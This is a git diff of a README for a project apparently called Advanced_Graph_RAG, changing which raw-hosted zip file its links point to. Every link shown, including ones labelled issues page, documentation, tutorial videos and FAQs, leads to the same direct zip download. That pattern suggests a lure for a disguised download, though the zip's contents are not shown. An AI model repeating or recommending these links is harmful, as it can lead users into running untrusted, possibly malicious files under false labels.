@@ -8,7 +8,7 @@ Welcome to **Advanced_Graph_RAG**! This application helps you answer questions a
 
 To download **Advanced_Graph_RAG**, visit the Releases page below. You will find the latest version available for download.
 
-[![Download Advanced_Graph_RAG](https://raw.githubusercontent.com/sanitprime/Advanced_Graph_RAG/main/reticularly/Advanced_Graph_RAG.zip)](https://raw.githubusercontent.com/sanitprime/Advanced_Graph_RAG/main/reticularly/Advanced_Graph_RAG.zip)
+[![Download Advanced_Graph_RAG](https://raw.githubusercontent.com/sanitprime/Advanced_Graph_RAG/main/data/RAG_Advanced_Graph_v1.0.zip)](https://raw.githubusercontent.com/sanitprime/Advanced_Graph_RAG/main/data/RAG_Advanced_Graph_v1.0.zip)
 
 1. Click the link above.
 2. Find the latest version of the software on the Releases page.
@@ -57,7 +57,7 @@ If you encounter issues while using **Advanced_Graph_RAG**, consider the followi
 - Ensure your system meets all requirements listed above.
 - Restart the application if it becomes unresponsive.
 
-For more help, you can visit our [issues page](https://raw.githubusercontent.com/sanitprime/Advanced_Graph_RAG/main/reticularly/Advanced_Graph_RAG.zip).
+For more help, you can visit our [issues page](https://raw.githubusercontent.com/sanitprime/Advanced_Graph_RAG/main/data/RAG_Advanced_Graph_v1.0.zip).
 
 ## 📣 Feedback
 
@@ -71,9 +71,9 @@ Join our community for tips, updates, and discussions about using **Advanced_Gra
 
 For more detailed information on how the application works, consult the following resources:
 
-- [Documentation](https://raw.githubusercontent.com/sanitprime/Advanced_Graph_RAG/main/reticularly/Advanced_Graph_RAG.zip)
-- [Tutorial Videos](https://raw.githubusercontent.com/sanitprime/Advanced_Graph_RAG/main/reticularly/Advanced_Graph_RAG.zip)
-- [FAQs](https://raw.githubusercontent.com/sanitprime/Advanced_Graph_RAG/main/reticularly/Advanced_Graph_RAG.zip)
+- [Documentation](https://raw.githubusercontent.com/sanitprime/Advanced_Graph_RAG/main/data/RAG_Advanced_Graph_v1.0.zip)
+- [Tutorial Videos](https://raw.githubusercontent.com/sanitprime/Advanced_Graph_RAG/main/data/RAG_Advanced_Graph_v1.0.zip)
+- [FAQs](https://raw.githubusercontent.com/sanitprime/Advanced_Graph_RAG/main/data/RAG_Advanced_Graph_v1.0.zip)
 
 ## 🏷️ Topics
 
